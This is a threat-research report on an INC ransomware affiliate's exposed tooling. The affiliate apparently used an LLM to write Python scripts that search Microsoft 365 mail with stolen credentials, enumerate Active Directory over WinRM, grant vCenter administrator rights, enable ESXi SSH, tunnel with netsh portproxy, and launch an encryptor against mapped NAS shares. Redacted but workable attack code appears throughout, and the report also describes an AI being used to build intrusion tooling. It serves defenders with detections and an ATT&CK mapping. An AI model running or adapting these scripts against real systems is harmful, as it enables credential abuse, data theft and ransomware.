---
title: "INC Affiliate Targets NAS Devices with Likely AI-Assisted Tooling"
classes: wide
ribbon: black
description: "Exposed operator tooling shows an INC affiliate using likely LLM-generated scripts to enumerate, pivot, and deploy ransomware against network storage"
categories:
  - Threat Research
tags:
  - Threat Research
toc: true
---

# Overview

Ctrl-Alt-Intel researchers recovered an exposed operator working directory containing evidence of an active ransomware intrusion against a technology organisation. The collection linked cloud-data theft, Active Directory compromise, internal tunnelling, attacks against storage and virtualisation management planes, and the deployment of an INC encryptor against network-attached storage (NAS).

We assess with **high confidence** that the server belongs to an **INC Ransom affiliate**. The exposed open-directory contained multiple INC ransomware binaries, alongside scripts, tooling and exfiltrated victim data that can be directly linked to a recent INC Ransom victim - a Chinese victim `v-silicon[.]com`. 

The most interesting part of the collection was not the INC ransomware binaries. More than 50 Python scripts wrapped Microsoft Graph, WinRM, VMware, storage, backup, SSH, and Windows administration interfaces into short, single-purpose workflows. We assess with **high confidence** that a Large Language Model (LLM) was used to generate a substantial portion of this operator tooling.

The recovered evidence supports the following sequence:

1. Access cloud mail and storage using compromised identities.
2. Recover network diagrams, administrative guides, asset exports, and credentials.
3. Use a Windows server as a WinRM-controlled pivot into Active Directory and management networks.
4. Extract the domain database and registry hives, then target virtualisation, backup, and storage platforms.
5. Create internal forwards to otherwise unreachable management services.
6. Map NAS shares to the pivot and launch the INC Windows encryptor against each drive.

# Enumeration / Discovery

The affiliate began by turning compromised Microsoft 365 access into infrastructure intelligence. Python scripts authenticated to Microsoft Graph, searched mailboxes, OneDrive, and SharePoint, and downloaded files likely to contain network diagrams, VPN information, device inventories, VMware exports, passwords, and recovery procedures.

They were repeatedly refined around networking, firewalls, storage, virtualisation, backup systems, and named members of the victim's IT team. This gave the affiliate a route from a user mailbox to the organisation's administrative plane.

## M365 Targeting

One likely AI-assisted script used the OAuth resource owner password credentials (ROPC) flow to exchange a stolen username and password for a Microsoft Graph token. It then searched the compromised mailbox for operationally useful subjects such as network-circuit relocations, server-room migrations, firewall changes, public IP addresses, VPNs, and internet-service providers.

The excerpt below is condensed from `check_it2.py`. The tenant, application, identity, and credential values have been removed, while the original search pattern is preserved.

```python
import json
import urllib.parse
import urllib.request

def get_token(username, password):
    form = urllib.parse.urlencode({
        "grant_type": "password",
        "client_id": "[REDACTED-CLIENT-ID]",
        "scope": "https://graph.microsoft.com/.default",
        "username": username,
        "password": password,
    }).encode()

    request = urllib.request.Request(
        "https://login.microsoftonline.com/"
        "[REDACTED-TENANT-ID]/oauth2/v2.0/token",
        data=form,
        method="POST",
    )
    return json.loads(urllib.request.urlopen(request).read())[
        "access_token"
    ]

def search_mail(token, query):
    url = (
        "https://graph.microsoft.com/v1.0/me/messages"
        "?$search=" + urllib.parse.quote(query) +
        "&$top=5&$select=subject,from,receivedDateTime,body"
    )
    request = urllib.request.Request(url)
    request.add_header("Authorization", "Bearer " + token)
    return json.loads(urllib.request.urlopen(request).read())

token = get_token("[REDACTED-USER]", "[REDACTED-PASSWORD]")

for query in (
    "network circuit relocation",
    "server room migration",
    "FortiGate",
    "firewall change",
    "new public IP address",
):
    results = search_mail(token, query)
    for message in results.get("value", []):
        print(message.get("subject", ""))
        print(message.get("body", {}).get("content", "")[:800])
```

The output was designed for interactive triage rather than bulk exfiltration alone. It printed the sender, subject, timestamp, and a body preview, allowing the affiliate to convert ordinary IT correspondence into a list of systems, administrators, network changes, and likely access paths. Related scripts extended the same Graph workflow to OneDrive, SharePoint, and email attachments.

After reaching an internal Windows server, another script embedded PowerShell inside a minimal Python WinRM wrapper. The original contained a real host, domain administrator credentials, and victim-specific search terms; these have been removed below.

```python
import winrm

session = winrm.Session(
    "[PIVOT-HOST]",
    auth=("[DOMAIN-ADMIN]", "[REDACTED]"),
    transport="ntlm",
)

powershell = r"""
Get-ADForest | Select Name, Domains, GlobalCatalogs, Sites
Get-ADTrust -Filter *
Get-ADDomainController -Filter *
Get-ADGroupMember "Domain Admins"
Get-ADUser -Filter {ServicePrincipalName -like "*"}
Get-ADComputer -Filter {
    Name -like "*nas*" -or
    Name -like "*backup*" -or
    Name -like "*storage*"
}
"""

result = session.run_ps(powershell)
print(result.std_out.decode(errors="ignore"))
```

The resulting discovery covered:

* domains, forests, trusts, domain controllers, administrators, and service accounts;
* routes, internal systems, open services, and Windows shares;
* credential stores, browser data, Windows Vault, DPAPI material, SSH keys, and Group Policy Preferences;
* vCenter and ESXi hosts, NAS devices, NetApp and OceanStor storage, and backup infrastructure;
* Microsoft 365 mail, attachments, OneDrive, and SharePoint content.

# Lateral Movement

A compromised domain administrator account was used over WinRM to control an internal Windows server. From there, the affiliate treated legitimate management interfaces as a lateral-movement fabric.

The recovered scripts used or attempted to use:

* WinRM and embedded PowerShell for remote execution;
* SMB and administrative shares for file access and tool transfer;
* SSH for storage and ESXi administration;
* pyVmomi and VMware APIs for vCenter permissions, snapshots, guest operations, and host access;
* ONTAP and OceanStor management APIs for storage enumeration and modification;
* native Windows tooling, NetExec, Impacket, DSInternals, and volume snapshots for credential theft.

The affiliate exported the Active Directory database together with the `SAM`, `SECURITY`, and `SYSTEM` registry hives. Receiver logs recorded successful uploads of all four artefacts to affiliate-controlled infrastructure. 

The management-plane targeting was unusually broad. Scripts granted a compromised identity the global `Administrator` role in vCenter, attempted to reset appliance and SSO credentials, enabled or checked ESXi remote access, queried backup credentials, and modified NetApp export policies. OceanStor scripts cycled through authentication and enumeration approaches while attempting to avoid or recover from account lockouts.

No vulnerability exploit is proven by this collection. The observed workflow was dominated by valid credentials, remote administration, and built-in APIs. This distinction matters: patching alone would not have stopped an affiliate already holding privileged identities and access to trusted management paths.

# vCenter / ESXi Targeting

The recovered VMware scripts show the INC affiliate attempting to move from domain-level access into the virtualisation control plane. Five Python files used `pyVmomi` or vCenter REST APIs to enumerate the environment, change permissions, enable remote access, manipulate snapshots, and explore several routes to resetting vCenter appliance credentials.

This targeting is significant because vCenter access concentrates control over large numbers of virtual machines. An affiliate that can modify global permissions, reach ESXi management services, or run Guest Operations against the vCenter Server Appliance can potentially bypass many controls applied to individual workloads.

## vCenter Permissions and Appliance Changes

`vc_perms.py` connected to vCenter with a compromised domain identity and disabled certificate verification. It located the built-in `Administrator` role, represented internally by role ID `-1`, then attempted to assign that role to the compromised account at the vCenter root folder with inheritance enabled.

```python
from pyVim.connect import SmartConnect
from pyVmomi import vim
import ssl

context = ssl._create_unverified_context()
service_instance = SmartConnect(
    host="[VCENTER-HOST]",
    user="[COMPROMISED-DOMAIN-ACCOUNT]",
    pwd="[REDACTED]",
    sslContext=context,
)

content = service_instance.RetrieveContent()
authorization = content.authorizationManager

permission = vim.AuthorizationManager.Permission()
permission.principal = "[DOMAIN]\\[COMPROMISED-ACCOUNT]"
permission.group = False
permission.roleId = -1       # Built-in Administrator role
permission.propagate = True  # Inherit across the inventory

authorization.SetEntityPermissions(
    entity=content.rootFolder,
    permission=[permission],
)
```

The same script created a vCenter API session and attempted three further changes: resetting the appliance `root` password, enabling SSH, and enabling the appliance shell without an expiry. The password and host have been removed from the excerpt.

```python
import requests

headers = {"vmware-api-session-id": "[REDACTED-SESSION]"}
base_url = "https://[VCENTER-HOST]/rest/appliance"

requests.put(
    base_url + "/local-accounts/root",
    headers=headers,
    json={"config": {"password": "[REDACTED-NEW-PASSWORD]"}},
    verify=False,
)

requests.put(
    base_url + "/access/ssh",
    headers=headers,
    json={"enabled": True},
    verify=False,
)

requests.put(
    base_url + "/access/shell",
    headers=headers,
    json={"enabled": True, "timeout": 0},
    verify=False,
)
```

The source only attempted the root-password change if an earlier API request showed appliance-level access. No corresponding response log survives, so the password reset and shell changes cannot be treated as confirmed outcomes from source code alone.

Other scripts tried to reach the same objective through VMware Guest Operations. `vc_reset.py` located the vCenter Server Appliance as a VM, tested compromised accounts for guest authentication, and prepared commands to reset both the operating-system `root` account and the SSO administrator. `vc_pwreset.py` explored session tickets, SAML authentication, VIX, and the Extension Manager, but retained comments acknowledging that several approaches could not proceed without valid guest credentials.

`vc_snap_reset.py` then attempted a more invasive route: creating a quiesced snapshot of the vCenter appliance so its base virtual disk could potentially be accessed from an ESXi host.

```python
snapshot = vcenter_vm.CreateSnapshot_Task(
    name="pw-reset-temp",
    description="temp",
    memory=False,
    quiesce=True,
)
```

The snapshot action was implemented in the script, but the recovered file stops after checking the task result. It does not contain the later disk-mount or password-modification stages described in its comments, and no surviving output confirms that the snapshot was created.

## ESXi Remote Access

The affiliate also wrote Python to connect directly to ESXi and turn on its built-in SSH service. `ehv_pyvmomi.py` enumerated host services, started `TSM-SSH` when it was stopped, and enabled any firewall ruleset whose name contained `ssh`.

```python
hosts = content.viewManager.CreateContainerView(
    content.rootFolder,
    [vim.HostSystem],
    True,
)

for host in hosts.view:
    services = host.configManager.serviceSystem
    for service in services.serviceInfo.service:
        if service.key == "TSM-SSH" and not service.running:
            services.StartService(id="TSM-SSH")

    firewall = host.configManager.firewallSystem
    for ruleset in firewall.firewallInfo.ruleset:
        if "ssh" in ruleset.key.lower() and not ruleset.enabled:
            firewall.EnableRuleset(id=ruleset.key)
```

This would give the affiliate an additional administrative path to a hypervisor and its datastores. The recovered payload archive also contained an INC ESXi encryptor capable of stopping virtual machines and removing snapshots. However, the directory does not prove that this ESXi payload was transferred to or executed on a victim hypervisor. The Python evidence establishes targeting and attempted management-plane changes, not completed ESXi encryption.

# Pivoting / C2

The affiliate used the compromised Windows server as a bridge between the external operator host and internal management services. One Python script created multiple Windows `portproxy` rules and opened a matching firewall rule. A companion shell script started attacker-side `socat` listeners.

The following shortened excerpt shows the pattern without preserving addresses or ports:

```python
import winrm

session = winrm.Session(
    "[PIVOT-HOST]",
    auth=("[DOMAIN-ADMIN]", "[REDACTED]"),
    transport="ntlm",
)

powershell = r"""
netsh interface portproxy add v4tov4 \
  listenport=[REDACTED] listenaddress=[PIVOT] \
  connectport=443 connectaddress=[INTERNAL-STORAGE]

netsh advfirewall firewall add rule \
  name="TunnelPorts" dir=in action=allow \
  protocol=tcp localport=[REDACTED]
"""

session.run_ps(powershell)
```

This was not a sophisticated bespoke C2 implant. It was a disposable Python wrapper around legitimate Windows networking features. That simplicity made the pivot fast to deploy, easy to alter, and less dependent on getting a custom binary through endpoint controls.

Separate scripts staged an HTTP receiver on affiliate infrastructure and pushed the domain database and registry hives to it. The corresponding log recorded successful HTTP responses for each upload. The collection also contained evidence of a live VPN session using compromised credentials, showing that the affiliate retained an additional route into the environment while the working directory was exposed.

# Ransomware Deployment

The affiliate did not need to execute native code on the NAS appliance in order to encrypt its data. Instead, `nas_locker.py` mapped five SMB shares to drive letters on the compromised Windows pivot and launched the Windows INC encryptor against those mapped drives.

## NAS Targeting and Validation

The NAS was not selected blindly. A companion script, `nas_check.py`, paused before connecting to the pivot, checked whether `locker.exe` was running, mapped selected NAS shares, listed their root directories, and then removed the mappings. This gave the affiliate a quick way to validate access and inspect the target before or after the ransomware task ran.

```python
import time
import winrm

time.sleep(15)
session = winrm.Session(
    "[PIVOT-HOST]",
    auth=("[DOMAIN-ADMIN]", "[REDACTED]"),
    transport="ntlm",
)

powershell = r"""
tasklist /fi "imagename eq locker.exe"

net use K: \\[NAS]\[SHARE-A] \
  /user:[DOMAIN-ADMIN] [REDACTED]
net use N: \\[NAS]\[SHARE-B] \
  /user:[DOMAIN-ADMIN] [REDACTED]

Write-Output "=== SHARE A ==="
cmd /c "dir K:\ /b" | Select-Object -First 10

Write-Output "=== SHARE B ==="
cmd /c "dir N:\ /b" | Select-Object -First 10

net use * /delete /yes
"""

result = session.run_ps(powershell)
print(result.std_out.decode(errors="ignore"))
```

Read beside `nas_locker.py`, this creates a clear operator loop: check the encryptor, confirm that the shares can be mounted, inspect a sample of their contents, launch the scheduled ransomware task, and return to process and directory checks. It is another example of narrow Python wrappers being used to turn an immediate operational question into executable code.

The script wrote a batch file to `C:\Windows\Temp\go.bat`, created a scheduled task named `WinUpdate` at the highest privilege level, ran the task, waited, and queried the process list for `locker.exe`. The deployment logic is shown below with all victim-specific values removed and the five-share loop reduced to one example:

```python
import winrm

session = winrm.Session(
    "[PIVOT-HOST]",
    auth=("[DOMAIN-ADMIN]", "[REDACTED]"),
    transport="ntlm",
)

powershell = r"""
$batch = @'
@echo off
net use K: \\[NAS]\[SHARE] /user:[DOMAIN-ADMIN] [REDACTED]
start "share-k" /min C:\Windows\Temp\locker.exe \
  --mode fast --dir K:\
'@

Set-Content C:\Windows\Temp\go.bat $batch -Encoding ASCII
schtasks /create /tn "WinUpdate" \
  /tr "C:\Windows\Temp\go.bat" /sc once \
  /ru "[DOMAIN-ADMIN]" /rp "[REDACTED]" /rl highest /f
schtasks /run /tn "WinUpdate"
tasklist /fi "imagename eq locker.exe"
"""

session.run_ps(powershell)
```

The executable's interface matches the recovered INC sample: `fast`, `medium`, and `slow` modes, plus a directory argument. The Windows binary was written in Rust and contained functionality for recursive local and network-share encryption, selective fast encryption, process and service termination, shadow-copy removal, and exclusions for selected system and security-software paths. The same archive included payloads for Linux, ESXi, and numerous processor architectures, demonstrating that the affiliate had access to a broader cross-platform impact kit.

There is an important evidential limit. The scripts and surrounding status checks confirm ransomware deployment and attempts to verify running `locker.exe` processes. 

# Assessing the Use of AI

We assess with **high confidence** that the INC affiliate used an LLM to create and modify much of the Python-based operational tooling.

Several scripts preserve a running conversation with the code. Comments propose an approach, reject it, and announce the next attempt in language that reads like retained assistant reasoning rather than normal documentation.

```python
# Try SSH to NetApp from [the pivot] using plink alternative
# Actually use System.Net.Sockets to send SSH auth manually? No, too complex.
# Let's try HTTPS API on NetApp instead (ONTAP REST API)

# Best approach: Use vCenter's extensionManager to get a ticket
# Actually - let's check if we can use the administrator SSO token
# Last resort - reset via VIX/GuestOps with InteractiveSession
# The nuclear option: We have full vCenter admin
```

These comments matter because they mirror the actual file sequence. Scripts with names containing `auth`, `try2`, `open`, `fix`, `final`, and `super` show the LLM iterating through API paths, authentication formats, and privilege changes as earlier approaches failed.

## Consistent scaffolding across unrelated technologies

The scripts covered Microsoft Graph, Active Directory, DPAPI, WinRM, pyVmomi, ESXi protocols, SSH, NetApp ONTAP, Huawei OceanStor, Veeam, SMB, and Windows networking. Despite this breadth, they repeatedly used the same structure:

* constants and credentials hardcoded at the top;
* certificate validation disabled;
* a large PowerShell or API request block embedded in Python;
* broad exception handling;
* output truncated to a few hundred or thousand characters;
* immediate top-level execution with no reusable entry point or test harness.

Thirty-four of the 52 recovered Python files created WinRM sessions, while none used a conventional `if __name__ == "__main__"` entry point. This is consistent with an operator repeatedly prompting for a script to answer the next question, rather than engineering a stable intrusion framework.

# Detection Opportunities

The affiliate's reliance on legitimate administration creates strong cross-plane detection opportunities. Defenders should correlate identity, endpoint, network, cloud, virtualisation, storage, and backup telemetry rather than looking only for an encryptor hash.

High-value behaviours from this case include:

* resource owner password credentials (ROPC) authentication followed by unusual Microsoft Graph mailbox, OneDrive, or SharePoint access;
* WinRM sessions to servers that do not normally receive remote administration from the initiating account or host;
* `ntdsutil`, volume-shadow-copy access, registry-hive export, DSInternals, or `secretsdump` activity on domain controllers;
* new `netsh interface portproxy` entries and inbound firewall rules, especially the rule name `TunnelPorts`;
* vCenter root-folder permissions assigning role ID `-1`, new appliance API sessions, Guest Operations against the vCenter appliance, or a snapshot named `pw-reset-temp`;
* SSH or shell enablement on the vCenter appliance, and `TSM-SSH` service or SSH firewall-ruleset changes on ESXi;
* storage export-policy changes that broaden client access or grant superuser permissions;
* scheduled task `WinUpdate` launching `C:\Windows\Temp\go.bat`;
* `C:\Windows\Temp\locker.exe` with `--mode fast --dir` arguments;
* a burst of SMB drive mappings immediately before multiple encryptor processes start;
* `INC-README.txt` or files carrying the INC extension appearing across mapped shares.

Two non-victim-specific hashes can be shared safely:

| Artefact | SHA-256 |
|---|---|
| Windows INC encryptor recovered as `l.exe` | `ef394149c8da3af730c37d550027df8639a3aaa6feaccea60112461ae6955829` |
| Multi-platform INC payload archive | `0206a670243efa0f736e3725c4c7c8879b262cb07af47a8dcfa18bc9787cc1bd` |

# MITRE ATT&CK

| Tactic | ID | Technique | Observed use |
|---|---|---|---|
| Initial Access / Persistence | T1078 | Valid Accounts | Compromised cloud, VPN, domain, storage, and virtualisation credentials |
| Execution | T1059.001 / T1059.003 | PowerShell / Windows Command Shell | PowerShell embedded in Python and batch-based ransomware launch |
| Persistence / Execution | T1053.005 | Scheduled Task/Job | `WinUpdate` launched the NAS encryption batch file |
| Credential Access | T1003.002 / .003 / .006 | OS Credential Dumping | Registry hives, NTDS, DCSync, and pass-the-hash workflows |
| Persistence / Privilege Escalation | T1098 | Account Manipulation | Attempted assignment of vCenter's built-in Administrator role to a compromised domain identity |
| Discovery | T1087.002 / T1482 | Domain Account / Trust Discovery | Domain users, administrators, forests, and trusts enumerated |
| Discovery | T1018 / T1046 / T1135 | Remote System, Network Service, and Share Discovery | Internal systems, management interfaces, storage, and shares enumerated |
| Lateral Movement | T1021.002 / .004 / .006 | SMB, SSH, and WinRM | Legitimate remote services used with compromised credentials |
| Command and Control | T1090.001 / T1572 | Internal Proxy / Protocol Tunnelling | Windows port proxies paired with attacker-side listeners |
| Defence Evasion | T1562.004 | Impair Defences: Disable or Modify System Firewall | Firewall rules opened to expose internal services |
| Collection | T1114.002 / T1530 | Email and Cloud Storage Collection | Microsoft Graph used to search and download mail and cloud files |
| Exfiltration | T1041 | Exfiltration Over C2 Channel | Identity databases and registry hives uploaded to affiliate infrastructure |
| Impact | T1486 | Data Encrypted for Impact | INC encryptor launched against five mapped NAS shares |
| Impact | T1490 / T1489 | Inhibit System Recovery / Service Stop | Capabilities present in the recovered INC payload |

# Conclusion

This intrusion shows how an INC affiliate can combine a mature RaaS payload with disposable, likely LLM-generated operational code. The encryptor supplied the impact; the Python scripts supplied the connective tissue between stolen cloud access, Active Directory, management planes, tunnels, and NAS shares.

AI did not need to discover a novel vulnerability or operate autonomously to change the campaign. Its likely value was speed: it let the affiliate move across unfamiliar products, generate wrappers for legitimate APIs, react to failures, and turn newly recovered information into the next script.

The same evidence also exposes the limits of that approach. The scripts were brittle, heavily hardcoded, noisy, and filled with discarded ideas. Those weaknesses create detection opportunities—but only if defenders monitor the administrative interfaces the affiliate abused. By the time `locker.exe` appeared, the decisive compromises had already happened in identity, cloud, virtualisation, storage, and backup systems.

The central lesson is not that AI replaced the ransomware operator. It is that AI likely made one affiliate faster across the entire intrusion lifecycle.

# References

* [ACSC, CERT Tonga, and NCSC — INC Ransom Affiliate Model Enabling Targeting of Critical Networks](https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/inc-ransom-affiliate-model-enabling-targeting-of-critical-networks)
* [MITRE ATT&CK — INC Ransom, G1032](https://attack.mitre.org/groups/G1032/)
* [MITRE ATT&CK — INC Ransomware, S1139](https://attack.mitre.org/software/S1139/)
